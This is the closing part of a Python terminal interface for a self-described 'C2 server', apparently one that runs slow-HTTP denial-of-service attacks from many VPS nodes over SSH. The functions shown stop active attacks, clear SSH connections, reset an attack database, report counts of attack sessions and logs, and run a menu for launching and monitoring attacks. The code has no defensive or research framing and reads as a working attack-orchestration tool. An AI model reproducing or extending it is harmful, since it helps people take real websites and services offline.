                self.db_manager.init_database()
                
                print(f"{Colors.GREEN}[SUCCESS] Database reset complete{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Failed to reset database: {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def clear_ssh_connections(self):
        """Clear all SSH connections"""
        try:
            self.ssh_manager.close_all_connections()
            print(f"{Colors.GREEN}[SUCCESS] All SSH connections cleared{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Failed to clear connections: {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def force_stop_all_attacks(self):
        """Force stop all active attacks"""
        try:
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to stop{Colors.RESET}")
            else:
                for session_id in list(self.attack_manager.active_attacks.keys()):
                    self.attack_manager.stop_attack(session_id)
                
                print(f"{Colors.GREEN}[SUCCESS] All attacks stopped{Colors.RESET}")
                
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Failed to stop attacks: {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def generate_security_report(self):
        """Generate a security report"""
        try:
            self.clear_screen()
            self.print_banner()
            
            print(f"\n{Colors.BOLD}SECURITY REPORT{Colors.RESET}")
            print("=" * 40)
            
            # Database statistics
            conn = sqlite3.connect(self.db_manager.db_file)
            cursor = conn.cursor()
            
            # VPS nodes
            cursor.execute('SELECT COUNT(*) FROM vps_nodes')
            total_vps = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM vps_nodes WHERE status = "online"')
            online_vps = cursor.fetchone()[0]
            
            # Attack sessions
            cursor.execute('SELECT COUNT(*) FROM attack_sessions')
            total_sessions = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM attack_sessions WHERE status = "running"')
            active_sessions = cursor.fetchone()[0]
            
            # Attack logs
            cursor.execute('SELECT COUNT(*) FROM attack_logs')
            total_logs = cursor.fetchone()[0]
            
            cursor.execute('SELECT COUNT(*) FROM attack_logs WHERE log_level = "ERROR"')
            error_logs = cursor.fetchone()[0]
            
            conn.close()
            
            # Display report
            print(f"\n{Colors.CYAN}DATABASE STATISTICS:{Colors.RESET}")
            print(f"  VPS Nodes: {total_vps} (Online: {online_vps})")
            print(f"  Attack Sessions: {total_sessions} (Active: {active_sessions})")
            print(f"  Attack Logs: {total_logs} (Errors: {error_logs})")
            
            print(f"\n{Colors.CYAN}SYSTEM STATUS:{Colors.RESET}")
            print(f"  Active SSH Connections: {len(self.ssh_manager.connections)}")
            print(f"  Active Attacks: {len(self.attack_manager.active_attacks)}")
            
            print(f"\n{Colors.CYAN}SECURITY METRICS:{Colors.RESET}")
            print(f"  Error Rate: {(error_logs/total_logs*100):.2f}%" if total_logs > 0 else "  Error Rate: 0.00%")
            print(f"  VPS Utilization: {(online_vps/total_vps*100):.2f}%" if total_vps > 0 else "  VPS Utilization: 0.00%")
            
            print(f"\n{Colors.YELLOW}Report generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
            
        except Exception as e:
            print(f"{Colors.RED}[ERROR] Failed to generate report: {str(e)}{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def run(self):
        """Main TUI loop"""
        while self.running:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    self.vps_management_menu()
                elif choice == '2':
                    self.launch_attack_menu()
                elif choice == '3':
                    self.monitor_attacks_menu()
                elif choice == '4':
                    self.attack_history_menu()
                elif choice == '5':
                    self.system_status_menu()
                elif choice == '6':
                    self.advanced_options_menu()
                elif choice == '0':
                    print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
                    self.running = False
                else:
                    print(f"{Colors.RED}Invalid option{Colors.RESET}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[EXIT] Shutting down C2 server...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
                time.sleep(2)

if __name__ == "__main__":
    tui = SlowHTTPTUI()
    tui.run()
